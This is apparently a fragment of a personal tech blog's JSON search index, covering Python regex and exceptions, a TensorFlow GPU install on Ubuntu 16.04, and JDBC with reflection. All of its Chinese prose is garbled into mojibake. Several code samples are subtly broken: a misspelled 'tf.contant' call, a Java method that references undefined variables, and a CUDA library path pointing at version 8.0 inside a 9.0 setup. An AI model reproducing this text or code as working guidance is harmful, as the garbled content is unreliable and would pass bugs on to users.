[0-9]   |      èŒƒå›´åœ¨ 0-9 ä¹‹é—´çš„å­—ç¬¦       |\n|    ^     |          åŒ¹é…å­—ç¬¦ä¸²å¼€å¤´          |\n|    $     |          åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾          |\n|    +     |     åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦ä¸€æ¬¡æˆ–å¤šæ¬¡     |\n|    *     |     åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦é›¶æ¬¡æˆ–å¤šæ¬¡     |\n\n[è¿™æ˜¯ä¸€ä¸ªå…³äº Python æ­£åˆ™è¡¨è¾¾å¼è¯¦ç»†è¯´æ˜çš„åšæ–‡](https://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html)\n\n#### æ•è·ç»„(group capturing)  \næ•è·ç»„å¯ä»¥è¿›ä¸€æ­¥ä»åŒ¹é…å­—ç¬¦ä¸²ä¸­æå–å‡ºç¬¦åˆæ¡ä»¶çš„ç‰¹å®šéƒ¨åˆ†ï¼Œå»ºç«‹ç»„çš„æ–¹æ³•æ˜¯æ‹¬å· `( )`ï¼Œå‡è®¾æˆ‘ä»¬æƒ³ä»ç”µå­é‚®ä»¶ä¸­æå–å‡ºâ€œå§“åâ€å’Œâ€œåŸŸåâ€ï¼Œåˆ™éœ€è¦ç”¨`( )`æŠŠç›¸åº”éƒ¨åˆ†æ‹¬èµ·æ¥ã€‚  \n[é‚®ç®±æ­£åˆ™è¡¨è¾¾å¼æ¨å¯¼è¿‡ç¨‹](http://blog.csdn.net/make164492212/article/details/51656638)\n```python\nimport re\ns = \"my email is greenlihui@live.com\"\nmatch = re.search(r'[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\\.[a-zA-Z0-9_-]+)+', s)\n\nif match:\n    print(match.group()) # æ­¤æ—¶è¾“å‡º greenlihui@live.com\nelse:\n    print(\"match not found\")\n\n# åˆ†åˆ«æå–å‡ºå§“åå’ŒåŸŸå\nmatch2 = re.search(r'([a-zA-Z0-9_-]+)@([a-zA-Z0-9_-]+(\\.[a-zA-Z0-9_-]+)+)', s)\n\nif match2:\n    print(match2.group()) # è¾“å‡º greenlihui@live.com\n    print(match2.group(1)) # è¾“å‡º greenlihui\n    print(match2.group(2)) # è¾“å‡º live.com\nelse:\n    print(\"match not found\")\n```\n#### findall()  \nå‰é¢çš„ `search()` æ–¹æ³•åªèƒ½è¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…æ¨¡å¼çš„å­—ç¬¦ä¸²ï¼Œè¦æ‰¾åˆ°æ‰€æœ‰åŒ¹é…çš„å­—ç¬¦ä¸²ç»“æœå°±è¦ä½¿ç”¨ `findall()` æ–¹æ³•ã€‚  \n```python\nimport re\ns = \"My telephone number are 12345-54321 and 23456-65432\"\nmatch = re.findall(r'\\d{5}', s)\n\nif match:\n    print(match) # è¾“å‡º ['12345', '54321', '23456', '65432]\n```\nå¯¹äº `findall` ä¹Ÿå¯ä»¥ä½¿ç”¨æ•è·ç»„ï¼Œè¿”å›çš„æ˜¯ç”±**å…ƒç»„**æ„æˆçš„**åˆ—è¡¨**ã€‚\n```python\nimport re\ns = \"My telephone number are 12345-54321 and 23456-65432\"\nmatch = re.findall(r'(\\d{5})-(\\d{5})', s)\n\nprint(match)\n# è¾“å‡º [('12345', '54321'), ('23456', '65432')]\n\nfor i in match:\n    print(i)\n    print(\"First group\", i[0])\n    print(\"Second group\", i[1])\n\n# è¾“å‡º\n# ('12345', '54321')\n# First group 12345\n# Second group 54321\n# ('23456', '65432')\n# First group 23456\n# Second group 65432\n```\n#### match()  \n`match()` å’Œ `search()` å¾ˆæ¥è¿‘ï¼ŒåŒºåˆ«å°±æ˜¯ `match()` ä»å­—ç¬¦ä¸²å¼€å¤´è¿›è¡ŒåŒ¹é…ï¼›å¦‚æœåœ¨ `search()` ä¸­åº”ç”¨ ^ è¡¨è¾¾å¼ï¼Œå¯ä»¥è·å¾—å’Œ `match()` ç›¸åŒçš„æ•ˆæœã€‚\n```python\nimport re\ns = \"python tuts\"\nmatch = re.match(r'py', s)\nif match:\n    print(match.group())\n# è¾“å‡º py\n\nmatch2 = re.search(r'^py', s)\nif match2:\n    print(match2.group())\n# åŒæ ·è¾“å‡º py\n```\n### å¼‚å¸¸å¤„ç†\nPython ä¸­å¼‚å¸¸å¤„ç†çš„æ­¥éª¤å…³é”®å­—æ˜¯ `try-except`ï¼Œè¿‡ç¨‹ä¸€èˆ¬å¦‚ä¸‹ï¼š\n```python\ntry:\n    # å¯èƒ½äº§ç”Ÿå¼‚å¸¸çš„ä»£ç \nexcept <ExceptionType1>:\n    # å¼‚å¸¸å¤„ç†\nexcept <ExceptionType2>:\n    # å¼‚å¸¸å¤„ç†\nexcept:\n    # å¼‚å¸¸å¤„ç†\n```\nPython ä¸­å¯ä»¥ç”¨ `else` æˆ–è€… `finally` æ¥æ§åˆ¶ç¨‹åºç»“æ„ï¼Œè¯­æ³•æ ¼å¼å’Œ `try` å’Œ `except` å¹¶åˆ—ï¼› `else` ä¸­çš„ä»£ç åªæœ‰åœ¨æœªå‘ç”Ÿå¼‚å¸¸æ—¶æ‰ä¼šæ‰§è¡Œï¼› `finally` ä¸­çš„ä»£ç æ— è®ºæ˜¯å¦å‘ç”Ÿå¼‚å¸¸éƒ½ä¼šæ‰§è¡Œã€‚\n#### æŠ›å‡ºå¼‚å¸¸  \né™¤äº†ä»£ç å‡ºé”™äº§ç”Ÿçš„å¼‚å¸¸ï¼Œè‡ªå·±æœ‰æ—¶å€™ä¹Ÿå¯ä»¥é€šè¿‡ `raise exception`(exception ä¸ºå¼‚å¸¸å¯¹è±¡) åˆ¶é€ ä¸€äº›å¼‚å¸¸ã€‚\n#### æ•æ‰å¼‚å¸¸\nç”¨ `raise` æŠ›å‡ºå¼‚å¸¸æ—¶å¯ä»¥é™„å¸¦å‚æ•°ï¼Œä¹‹ååœ¨ `except` æ—¶ï¼Œå¯ä»¥é€šè¿‡ `except Exception as e` æŠŠå¼‚å¸¸å¯¹è±¡ä¿å­˜åˆ°å˜é‡ e (ä¹Ÿå¯ä»¥å«åˆ«çš„)ã€‚\n```python\n# æ’å…¥èº«é«˜çš„ç¨‹åº\nheights = [164, 167, 169, 171]\ndef record_height(index, height):\n    if index >= len(heights):\n        raise IndexError(index)\n    else:\n        heights[index] = height\n\ntry:\n    record_height(5, 185)\nexcept Exception as e:\n    print(\"åˆ—è¡¨ä¸å­˜åœ¨ç¬¬\", e, \"ä¸ªå…ƒç´ \")\n```\n#### è‡ªå®šä¹‰å¼‚å¸¸  \nè‡ªå®šä¹‰å¼‚å¸¸å…¶å®å°±æ˜¯å®šä¹‰ä¸€ä¸ªç±»ï¼Œè®©å…¶ç»§æ‰¿è‡ª `Exception`ã€‚\n```python\nclass AssignmentError(Exception):\n    def __init__(self, index, height, message):\n        self.index = index\n        self.height = height\n        self.message = message\n\n# å¯¹äºå®šä¹‰çš„ exception ä¸­çš„ä¸‰ä¸ªå®ä¾‹å˜é‡ï¼Œmessage ç”¨äºåœ¨æ§åˆ¶å°è¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œindex å’Œ height ä¿®å¤åˆ—è¡¨å…ƒç´ ä¸è¶³çš„é—®é¢˜ï¼Œç„¶åå°è¯•é‡æ–°æ’å…¥ã€‚\n```\n#### ä¸­æ­¢é‡è¯•  \n```python\nheights = [164, 167, 169, 171]\ndef record_height(index, height):\n    if index >= len(heights):\n        raise AssignmentError(index, height, \"\\né‡åˆ°å¼‚å¸¸ï¼ˆä¸å­˜åœ¨è¯¥å…ƒç´ ï¼Œå°è¯•å¤„ç†\\n\")\n    else:\n        heights[index] = height\n\ntry:\n    record_height(4, 185)\nexcept AssignmentError as e:\n    print(e.message) # è¾“å‡ºä¸Šé¢ä¼ å…¥çš„ message ä¿¡æ¯ã€‚\n    heights.append(e.height)\n```\n#### æ”¹è¿›  \né¢å¤–çš„ä¸€äº›è¦æ±‚ï¼šå¦‚æœæ’å…¥çš„ index å¤§äº heights çš„é•¿åº¦ 4ï¼Œæ¯”å¦‚åœ¨ index ä¸º 6 å¤„æ’å…¥ 180ï¼Œåˆ™ 180 å’Œå‰é¢å°±æœ‰ä¸¤ä¸ªç©ºæ ¼ï¼Œåº”è¯¥åœ¨ç©ºæ ¼å¤„å¡«å…¥ 0ï¼Œå¾—åˆ° heights = [164, 167, 169, 171, 0, 0, 180]\n```python\ntry:\n    record_height(6, 180)\nexcept AssignmentError as e:\n    print(e.message)\n    for index in range(len(heights), e.index):\n        heights.append(0)\n    heights.append(e.height)\n```\nå¦‚æœè¿˜æœ‰å…¶ä»–çš„è¦æ±‚æ¯”å¦‚åŸæ¥å¡«è¿‡èº«é«˜çš„ä½ç½®ä¸èƒ½å†è¦†ç›–å¡«å†™ç­‰ç­‰å°±é è‡ªå·±å»è¯•ç€å†™å†™å§ã€‚","tags":["Python"]},{"title":"Ubuntu16.04 ä½¿ç”¨ Anaconda å®‰è£… Tensorflow","url":"/2017/11/27/ubuntu-install-tensorflow/","content":"\n\n## å®‰è£… Anaconda\n\nå» [å®˜ç½‘](https://www.anaconda.com/download/#linux) ä¸‹è½½ [Anaconda3-5.1.0-Linux-x86_64.sh](https://repo.continuum.io/archive/Anaconda3-5.1.0-Linux-x86_64.sh)ï¼Œè¿™é‡Œæˆ‘ä¸‹è½½çš„ç‰ˆæœ¬æ˜¯ `Python3.6` çš„ã€‚\n\n![ä¸‹è½½ Anaconda](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627175555.png)\n\nä½¿ç”¨ `sh` å‘½ä»¤ï¼Œ`sh Anaconda3-5.1.0-Linux-x86_64.sh`ï¼Œæ ¹æ®æç¤ºå®Œæˆå®‰è£…ã€‚\n\n### æ·»åŠ é•œåƒåœ°å€\n\nä¸ºé˜²æ­¢å®‰è£…åŒ…è¿‡ç¨‹ä¸­é€Ÿåº¦è¿‡æ…¢ï¼Œæ·»åŠ å›½å†…é•œåƒåœ°å€ã€‚  \n\n```bash\n# æ·»åŠ æ¸…åä¾èµ–è®¿é—®åœ°å€\nconda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/\n# è®¾ç½®æœç´¢æ—¶æ˜¾ç¤ºé€šé“åœ°å€\nconda config --set show_channel_urls yes\n```\n\nä¹Ÿå¯ä»¥åœ¨ `~/.condarc` æ–‡ä»¶ä¸­ç›´æ¥æ·»åŠ å’Œä¿®æ”¹ã€‚\n\n### æ·»åŠ ç¯å¢ƒ\n\nAnaconda å¯ä»¥ä¸ºä¸åŒçš„é¡¹ç›®å»ºç«‹ä¸åŒçš„è¿è¡Œç¯å¢ƒï¼Œä½¿ç”¨ `conda create -n env_name` å‘½ä»¤æ¥åˆ›å»ºç¯å¢ƒï¼ˆenv_name å³ç¯å¢ƒåç§°ï¼‰ã€‚  \nå¦‚æœæƒ³é‡å‘½åæŸä¸€ä¸ªç¯å¢ƒï¼ŒAnaconda æ²¡æœ‰ç›¸å…³å‘½ä»¤å¯ä»¥ç›´æ¥ä¿®æ”¹ç¯å¢ƒåç§°ï¼Œè¿™é‡Œåªèƒ½å…ˆå…‹éš†ç¯å¢ƒå†å°†åŸç¯å¢ƒåˆ é™¤ã€‚\n\n```bash\nconda create --name new_name --clone old_name\nconda remove --name old_name --all\n```\n\n### å®‰è£…æ—¶å€™é‡åˆ°çš„å‘\n\nå› ä¸ºæˆ‘ç»ˆç«¯ä½¿ç”¨çš„æ˜¯ zshï¼Œè€Œå®‰è£… Anaconda æ·»åŠ å‘½ä»¤è·¯å¾„åˆ°çš„æ˜¯ bashï¼Œå¯¼è‡´æˆ‘åœ¨ zsh é‡Œé¢è¿è¡Œ conda å‘½ä»¤æç¤º command not foundã€‚  \nè§£å†³åŠæ³•ï¼Œåœ¨ `~/.zshrc` æˆ–è€… `/etc/profile` åé¢æ·»åŠ ä¸Š Anacodna å®‰è£…ç›®å½•ä¸‹çš„ bin ç›®å½•å³å¯ã€‚\n\n```bash\nexport PATH=/home/lihui/anaconda3/bin:$PATH\n```\n\n## å®‰è£… Tensorflow CPU ç‰ˆ\n\nCPU ç‰ˆæœ¬çš„ Tensorflow å®‰è£…å¾ˆç®€å•ï¼Œå‡ æ¡å‘½ä»¤å³å¯  \nå»ºç«‹ç¯å¢ƒ `conda create -n tensorflow_cpu python=3.6`  \næ¿€æ´»ç¯å¢ƒ `source activate tensorflow_cpu`  \nåœ¨ç¯å¢ƒä¸­å®‰è£… `pip install tensorflow`   \nè¿›å…¥ python æµ‹è¯•\n\n```python\nimport tensorflow as tf\nhello = tf.contant('hello')\nsess = tf.Session()\nsess.run(hello)\n```\n\nå¦‚æœè¾“å‡º b'hello'ï¼Œåˆ™è¯´æ˜å®‰è£…æ²¡æœ‰é—®é¢˜ã€‚\n\n## å®‰è£… Tensorflow GPU ç‰ˆ\n\nå½“å‰æœ€é¡¶çº§çš„CPUåªæœ‰4æ ¸æˆ–è€…6æ ¸,æ¨¡æ‹Ÿå‡º8ä¸ªæˆ–è€…12ä¸ªå¤„ç†çº¿ç¨‹æ¥è¿›è¡Œè¿ç®—,ä½†æ˜¯æ™®é€šçº§åˆ«çš„GPUå°±åŒ…å«äº†æˆç™¾ä¸Šåƒä¸ªå¤„ç†å•å…ƒ,é«˜ç«¯çš„ç”šè‡³æ›´å¤š,è¿™å¯¹äºå¤šåª’ä½“è®¡ç®—ä¸­å¤§é‡çš„é‡å¤å¤„ç†è¿‡ç¨‹æœ‰ç€å¤©ç”Ÿçš„ä¼˜åŠ¿ï¼Œè€ŒCNNä¸­çš„å·ç§¯æ“ä½œåˆ™æ­£æ˜¯è¿™ç§å¤§é‡çš„ã€é‡å¤çš„è®¡ç®—ã€‚  \nå®‰è£… GPU ç‰ˆæœ¬ Tensorflow è¦æ±‚æ˜¾å¡çš„è®¡ç®—èƒ½åŠ›å¤§äº 3.5ï¼Œæˆ‘çš„æ˜¾å¡æ»¡è¶³è¦æ±‚æ‰€ä»¥æƒ³å°å°é²œã€‚  \nå®‰è£… Tensorflow ä¹‹å‰å…ˆè¦å®‰è£… `CUDA` å’Œ `CUDNN`ï¼Œä¸‹é¢çš„å®‰è£…æ­¥éª¤æ˜¯æˆ‘ç»¼åˆä¼—å¤šå®‰è£…æ•™ç¨‹å¾—å‡ºçš„ï¼Œå¦‚æœè‹±è¯­å¥½æœ‰è€å¿ƒè€Œä¸”å¯ä»¥ç¿»å¢™ï¼Œæœ€å¥½å»çœ‹å®˜æ–¹çš„ `installation guide` æˆ–è€… `quickstart tutorial`ï¼Œä¸ç®¡å®‰è£…ä½¿ç”¨ä»€ä¹ˆè½¯ä»¶ï¼Œå®˜æ–¹è¯´æ˜æ°¸è¿œæ˜¯æœ€æ¸…æ¥šæ˜ç™½çš„ã€‚\n\n### å®‰è£… NVIDIA é©±åŠ¨\n\nä½¿ç”¨ `ubuntu-drivers devices` å‘½ä»¤æŸ¥çœ‹ä½ çš„æ˜¾å¡æ”¯æŒè€Œä¸”æ¨èçš„é©±åŠ¨ï¼ˆåé¢æœ‰ä¸ª recommendedï¼‰ï¼Œæˆ‘çš„æ¨èå®‰è£… nvidia-384ï¼Œæ¥å¼€å§‹å®‰è£…å§ã€‚  \nå…³é—­ Ubuntu çš„å›¾å½¢ç•Œé¢ï¼ˆ`sudo service lightdm stop`)ï¼Œé»‘å±ä¸è¦æ…Œï¼ŒæŒ‰ä½ `ctrl+alt+f1` è¿›å…¥ `tty` æ¨¡å¼ï¼Œè¾“å…¥ç”¨æˆ·åå¯†ç è¿›å…¥ç»ˆç«¯ï¼Œæ‰§è¡Œå‘½ä»¤å®‰è£…ç›¸å¯¹åº”é©±åŠ¨ï¼ˆ`sudo apt install nvidia-384`)ï¼Œé‡å¯ï¼ˆ`reboot`ï¼‰ã€‚é‡å¯åè¿›å…¥ç³»ç»Ÿï¼Œæ‰“å¼€ `NVIDIA X Server Settings` æŸ¥çœ‹ `PRIME Profiles` æ˜¯ä¸æ˜¯ `NVIDIA`ï¼Œå¦‚æœä¸æ˜¯ä¿®æ”¹æˆ `NVIDIA` é‡æ–°é‡å¯ã€‚\n\n### å®‰è£… CUDA é©±åŠ¨\n\n1. ç›®å‰ Tensorflow æœ€æ–°åªæ”¯æŒ CUDA 9.0ï¼Œæ‰€ä»¥æœ€é«˜åªèƒ½ä¸‹è½½ CUDA 9.0ï¼Œäº²èº«ç»å†å‘Šè¯‰ä½ ï¼Œå¦‚æœä¸‹è½½ 9.1 å³ä»¥ä¸Šç‰ˆæœ¬ä¼šæŠ¥é”™ï¼ˆå…·ä½“ä»€ä¹ˆé”™å¿˜è®°æˆªå›¾äº†ï¼‰ã€‚\n2. è¿›å…¥ä¸‹è½½é¡µé¢åï¼Œä¸‹è½½ runfile æ–‡ä»¶ï¼ï¼ï¼ï¼ˆæˆ‘ä¸‹æˆ deb æ–‡ä»¶ï¼Œå®‰è£…æ²¡é—®é¢˜ï¼Œåé¢ä½¿ç”¨å‡ºé—®é¢˜äº†ã€‚ã€‚ï¼‰\n3. CUDA ä¸æ”¯æŒæ–°ç‰ˆæœ¬çš„ gccï¼Œæ‰€ä»¥å…ˆè¿›è¡Œ [gcc é™çº§](https://www.cnblogs.com/in4ight/p/6626708.html)ï¼Œç„¶åå†æ¥å®‰è£… CUDAã€‚\n\n```sh\n# å®‰è£…ä½ç‰ˆæœ¬ gcc\nsudo apt install gcc-4.8\n# æŸ¥çœ‹å·²æœ‰çš„ gcc\nls /usr/bin/gcc*\n# è®¾ç½®ä¼˜å…ˆçº§ï¼Œæœ€åä¸€ä¸ªæ•°å­—ä¸ºä¼˜å…ˆçº§\nsudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.8 100\n# æŸ¥çœ‹ä¼˜å…ˆçº§\nsudo update-alternatives --config gcc\n```\n\n4. Tensorflow å®˜æ–¹è¯´æ˜ CUDA 9.0 è¿˜è¦å®‰è£… libcupti-devï¼ˆ`sudo apt install libcupti-dev`ï¼‰ã€‚\n5. ç°åœ¨å¼€å§‹å®‰è£…CUDAï¼ŒåŒæ ·å…³é—­ Ubuntu å›¾å½¢ç•Œé¢ï¼ˆ`sudo service lightdm stop`) \n6. æ¥ä¸‹æ¥è¿˜è¦ç¦ç”¨ Ubuntu è‡ªå¸¦çš„æ˜¾å¡é©±åŠ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ `/etc/modprobe.d/blacklist-nouveau.conf`ï¼Œå¹¶å¡«å…¥ä¸‹é¢ä¸¤è¡Œ\n\n```bash\nblacklist nouveau\noptions nouveau modeset=0\n```\n\n  ç„¶åé‡æ–°ç”Ÿæˆå†…æ ¸å‚æ•°ï¼ˆ`sudo update-initramfs -u`ï¼‰ \n\n7. ç„¶åè¿›å…¥ä¸‹è½½ç›®å½•ï¼Œå¼€å§‹å®‰è£…ï¼ˆ`sudo sh cuda_9.0.176_384.81_linux.run`) \n8. `ctrl+c` è·³è¿‡è®¸å¯è¯ä¹‹ç±»çš„ä¸œè¥¿ï¼Œè¾“å…¥ accept å¼€å§‹å®‰è£…ï¼Œåœ¨å®‰è£…è¿‡ç¨‹ä¸­ï¼Œé€‰æ‹©ä¸å®‰è£… NVIDIA é©±åŠ¨å’Œ openGL åº“ï¼Œå®‰è£…å®Œæˆåå¼€å§‹é…ç½®ç¯å¢ƒå˜é‡ã€‚åœ¨ `~/.bashrc` æˆ–è€… `~/.zshrc` æˆ–è€… `/etc/profile` åæ·»åŠ \n\n```bash\nexport PATH=/usr/local/cuda/bin:$PATH\nexport LD_LIBRARY_PATH=/usr/local/cuda/lib64:/usr/local/cuda-8.0/extras/CUPTI/lib64:$LD_LIBRARY_PATH\nexport CUDA_HOME=/usr/local/cuda\n```\n\n9. ä½¿ç”¨ `nvcc -V` å‘½ä»¤å¯ä»¥æŸ¥çœ‹ CUDA ç‰ˆæœ¬ã€‚  \n\n### æµ‹è¯• CUDA\n\nè¿›å…¥å®‰è£…æ—¶å®‰è£…çš„ `~/NVIDIA_CUDA-9.0_Samples` ç›®å½•ï¼Œç¼–è¯‘ CUDA çš„ç¤ºä¾‹æ–‡ä»¶ï¼ˆ`make`ï¼‰ç­‰å¾… 10 åˆ†é’Ÿå·¦å³æ— æŠ¥é”™å³å¯ã€‚  \nè¿›å…¥ç”Ÿæˆçš„ bin ç›®å½•ä¸‹æ‰¾åˆ°ç¼–è¯‘å¥½çš„æ–‡ä»¶å¹¶éšæ„è¿è¡Œä¸€ä¸ªï¼Œè¿™é‡Œé€‰æ‹© deviceQueryï¼ˆ`./deviceQuery`)ï¼Œå¾—åˆ°æœ€åç»“æœ `Result = PASS` åˆ™è¯´æ˜å®‰è£…æˆåŠŸã€‚\n\n### å®‰è£… CUDNN\n\n1. å» NVIDIA ä¸‹è½½ CUDA ç‰ˆæœ¬ç›¸å¯¹åº”çš„ CUDNN `.tgz` åŒ… \n2. è§£å‹ï¼ˆ`tar xvf cudnn-9.0-linux-x64-v7.tgz`)\n3. å°†è§£å‹å `cuda/include` ç›®å½•ä¸­çš„ `cudnn.h` æ–‡ä»¶æ‹·è´åˆ° `/usr/local/cuda/include/` ç›®å½•ä¸‹ï¼ˆ`sudo cp cuda/include/cudnn.h /usr/local/cuda/include`ï¼‰ \n4. å°† `cuda/lib64` ç›®å½•ä¸­çš„åº“æ‹·è´åˆ° `/usr/local/cuda/lib64/` ç›®å½•ä¸‹ï¼ˆ`sudo cp cuda/lib64/libcudnn* /usr/local/cuda/lib64`ï¼‰\n5. å†èµ‹äºˆç›¸å…³æƒé™ï¼ˆ`sudo chmod a+r /usr/local/cuda/include/cudnn.h /usr/local/cuda/lib64/libcudnn*`ï¼‰ï¼Œè¿™æ ·ï¼ŒCUDNN å°±å®‰è£…å¥½äº†ã€‚\n6. å¦‚æœè¦å¸è½½ CUDAï¼Œåœ¨ `/usr/local/cuda/bin` ç›®å½•ä¸‹,æœ‰ cuda è‡ªå¸¦çš„å¸è½½å·¥å…·å¯ä»¥ä½¿ç”¨ï¼ˆ`sudo ./uninstall_cuda_9.0.pl`ï¼‰ã€‚\n7. å¦‚æœè¦å¸è½½ NVIDIA é©±åŠ¨ï¼Œ`sudo apt purge nvidia-*` æˆ–è€… `sudo apt purge nvidia-\\*`ã€‚\n\n### å®‰è£… Tensorflow\n\nå»ºç«‹ç¯å¢ƒ `conda create -n tensorflow_g`  \næ¿€æ´»ç¯å¢ƒ `source activate tensorflow_g`  \nåœ¨ç¯å¢ƒä¸­å®‰è£… `pip install tensorflow-gpu`  \næµ‹è¯•åé€€å‡º `source deactivate`  \n\n## å…¶ä»–\n\n### å‚è€ƒæ•™ç¨‹\n\n[æ•™ç¨‹1](https://segmentfault.com/a/1190000008234390)  \n[æ•™ç¨‹2](https://www.linuxidc.com/Linux/2016-11/137561.htm)\n[å‡ºç°å¾ªç¯ç™»å½•çš„é—®é¢˜](https://www.jianshu.com/p/34236a9c4a2f)\n\n### æŸ¥çœ‹ Tensorflow è·‘çš„æ˜¯ CPU è¿˜æ˜¯ CPUç‰ˆæœ¬\n\nç›´æ¥ `session.run` è¿è¡Œä¸ª `a+b` çš„è¿ç®—ï¼Œä¼šæœ‰è®¾å¤‡åˆå§‹åŒ–çš„æç¤º\n\n```python\n# Creates a graph.\na = tf.constant([1.0, 2.0, 3.0, 4.0, 5.0, 6.0], shape=[2, 3], name='a')\nb = tf.constant([1.0, 2.0, 3.0, 4.0, 5.0, 6.0], shape=[3, 2], name='b')\nc = tf.matmul(a, b)\n# Creates a session with log_device_placement set to True.\nsess = tf.Session(config=tf.ConfigProto(log_device_placement=True))\n# Runs the op.\nprint(sess.run(c))\n```","tags":["ubuntu","tensorflow"]},{"title":"å­¦ä¹  JDBC","url":"/2017/09/10/jdbc/","content":"\næš‘å‡å®ä¹ å®Œåï¼Œå›å®¶å¾…äº†ä¸€ä¸ªæ˜ŸæœŸï¼Œç„¶åå›æ ¡å­¦ä¹ äº†ï¼Œå­¦äº†ç‚¹ä¸œè¥¿ï¼Œä¸è¿‡ä¸€ç›´æ²¡æœ‰å†™æ€»ç»“ï¼ˆæ‰€ä»¥åšå®¢ä¸€ç›´æ²¡æ›´ï¼‰ï¼Œåé¢æ…¢æ…¢æ‰¾æ—¶é—´è¡¥ä¸Šæ¥ã€‚  \nè½¬çœ¼æ–°çš„ä¸€å‘¨åˆåˆ°äº†ï¼Œæœ¬æ¥è¿™ç¯‡æ€»ç»“æ˜¯å‘¨æœ«åº”è¯¥å®Œæˆçš„ï¼Œæ˜¨å¤©ä½“æ£€å› ä¸ºç½‘ç»œé—®é¢˜è€½æäº†å¥½ä¹…ï¼Œæ™šä¸Šå°†è¿‘ 7 ç‚¹æ‰å›åˆ°å­¦æ ¡ï¼Œç„¶åå°±æ²¡æœ‰è¿‡æ¥å®éªŒå®¤äº†ã€‚  \nè¿›å…¥æ­£é¢˜ï¼Œè¿™æ˜¯ä¸€ç¯‡å…³äºä½¿ç”¨ Java æ“ä½œæ•°æ®åº“çš„æ€»ç»“ï¼Œä¹Ÿå°±æ˜¯ JDBC (Java Database Connectivity)ï¼Œä»¥ä½¿ç”¨ MySQL æ•°æ®åº“ä¸ºä¾‹ã€‚å¦å¤–è¿™ç¯‡æ–‡ç« æœ‰ç‚¹é•¿ï¼ŒåŸæœ¬æ‰“ç®—åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼Œæƒ³äº†æƒ³ï¼Œæ²¡æœ‰è¿™ä¸ªå¿…è¦ï¼Œæˆ‘å†™çš„è¿˜ç®—æ¸…æ¥šã€‚\n\n## JDBC ç¼–ç¨‹æ­¥éª¤\n\n1. **åŠ è½½æ•°æ®åº“é©±åŠ¨**  \n   å¯¼å…¥å¯¹åº”æ•°æ®åº“æ‰€éœ€çš„é©±åŠ¨  \n   Class.forName(\"com.mysql.jdbc.Driver\");\n2. **é€šè¿‡ DriverManager è·å–æ•°æ®åº“è¿æ¥**  \n   DriverManager.getConnection(String url, String username, String password);  \n   Url æ ¼å¼ï¼šjdbc:subprotocol:...  \n   MySQL æ ¼å¼ï¼šjdbc:mysql://hostname:port/databasename  \n3. **é€šè¿‡ Connection åˆ›å»º Statement**  \n   Statement stmt = conn.createStatement();  \n   PreparedStatement ps = conn.prepareStatement();  \n4. **ä½¿ç”¨ Statement æ‰§è¡Œ sql è¯­å¥**  \n   executeUpdate();  \n   executeQuery();  \n5. **æ“ä½œç»“æœé›†**  \n   next(), previous()...  \n   getXxx();  \n6. **å…³é—­æ•°æ®åº“èµ„æº**  \n   xxx.close();  \n   å…ˆå…³é—­åæ‰“å¼€çš„ã€‚\n\n## åˆ©ç”¨åå°„è·å–æŸ¥è¯¢åˆ°çš„ä¸€æ¡æ•°æ®æ‰€å¯¹åº”çš„å¯¹è±¡\n\nå½“æ•°æ®åº“è¡¨ä¸­æ¯ä¸€è¡Œæ•°æ®å°±æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¸”å­˜åœ¨è¯¥å¯¹è±¡æ‰€å¯¹åº”çš„ç±»æ—¶ï¼Œå³å¯ä½¿ç”¨å¦‚ä¸‹ä»£ç è·å–æ•°æ®åº“å¯¹è±¡ã€‚ä»£ç å¾ˆå¥½æ‡‚ï¼Œä¸åšè¿‡å¤šè§£é‡Šäº†ï¼Œæœ‰é—®é¢˜å¯ä»¥å‘æˆ‘é‚®ç®±ä¸€èµ·è®¨è®ºã€‚\n\n```Java\n// éœ€è¦å¯¼å…¥ BeanUtils å’Œ Logging Jar åŒ…ï¼ˆapache commonsï¼‰\npublic <T> T get(Class<T> clazz, String sql, Object... args) {\n    T entity = null;\n    Connection conn = null;\n    PreparedStatement ps = null;\n    ResultSet rs = null;\n    try {\n        conn = JDBCTools.getConnection();\n        ps = conn.prepareStatement(sql);\n        // å¡«å…… PreparedStatement å ä½ç¬¦\n        for (int i = 0; i < args.length; i++) {\n            ps.setObject(i + 1, args[i]);\n        }\n        rs = ps.executeQuery();\n        if (rs.next()) {\n            entity = clazz.newInstance();\n            ResultSetMetaData rsmd = rs.getMetaData();\n            for (int i = 0; i < rsmd.getColumnCount(); i++) {\n                String columnLabel = rsmd.getColumnLabel(i + 1);\n                Object columnValue = rs.getObject(i + 1);\n                // ç»™å¯¹è±¡çš„å±æ€§èµ‹å€¼\n                BeanUtils.setProperty(entity, propertyName, propertyValue);\n            }\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        JDBCTools.release(rs, ps, conn);\n    }\n    return entity;\n}\n```\n\nåŒç†ï¼Œè·å–æŸ¥è¯¢åˆ°çš„ä¸€ç»„å¯¹è±¡ï¼ŒæŠŠç»“æœé›†çš„ if åˆ¤æ–­æ”¹æˆ whileã€‚\n\n```Java\npublic <T> List<T> getList(Class<T> clazz, String sql, Object... args) {\n    List<T> list = new ArrayList<>();\n    Connection conn = null;\n    PreparedStatement ps = null;\n    ResultSet rs = null;\n    try {\n        conn = JDBCTools.getConnection();\n        ps = conn.prepareStatement(sql);\n        for (int i = 0; i < args.length; i++) {\n            ps.setObject(i + 1, args[i]);\n        }\n\n        rs = ps.executeQuery();\n\n        ResultSetMetaData rsmd = rs.getMetaData();\n        T entity = null;\n        while (rs.next()) {\n            entity = clazz.newInstance();\n            for (int i = 0; i < rsmd.getColumnCount(); i++) {\n                String columnLabel = rsmd.getColumnLabel(i + 1);\n                Object value = rs.getObject(i + 1);\n                BeanUtils.setProperty(entity, columnLabel, value);\n            }\n            list.add(entity);\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        JDBCTools.release(rs, ps, conn);\n    }\n    return 